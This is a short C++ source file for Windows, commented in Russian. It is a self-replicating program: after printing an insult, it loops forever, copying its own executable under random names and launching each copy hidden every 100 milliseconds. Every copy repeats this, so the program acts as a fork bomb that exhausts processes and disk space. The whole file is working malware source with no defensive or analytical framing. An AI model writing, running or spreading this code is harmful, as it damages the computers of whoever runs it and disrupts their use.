#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
using namespace std;

// Функция для получения пути к текущему исполняемому файлу
string getProgramPath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH); // Получаем путь текущего исполняемого файла
    return string(buffer);
}

// Функция для копирования программы в новое место
void copyProgram(const string& originalPath, const string& newPath) {
    ifstream src(originalPath, ios::binary);
    ofstream dest(newPath, ios::binary);
    dest << src.rdbuf();
    src.close();
    dest.close();
}

// Функция для запуска скрытого процесса
void startHiddenProcess(const string& programPath) {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    // Запуск скрытого процесса
    if (CreateProcess(
        programPath.c_str(), // Путь к программе
        NULL,                // Аргументы командной строки
        NULL,                // Безопасность
        NULL,                // Безопасность дочернего процесса
        FALSE,               // Без наследования дескрипторов
        CREATE_NO_WINDOW,    // Без окна
        NULL,                // Среда
        NULL,                // Текущий каталог
        &si,                 // Информация о старте
        &pi)) {              // Информация о процессе
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

int main() {
    // Получаем путь к текущей программе
    string programPath = getProgramPath();
    printf("You are Idiot\n");

    while (true) {
        // Генерация нового имени для копии программы
        string newProgramPath = programPath + "_copy_" + to_string(rand());
        
        // Копируем программу
        copyProgram(programPath, newProgramPath);
        
        // Запускаем копию скрытно
        startHiddenProcess(newProgramPath);

        // Спим перед следующим запуском
        Sleep(100); // Программа будет создавать новые копии каждые 100 миллисекунд
    }

    return 0;
}
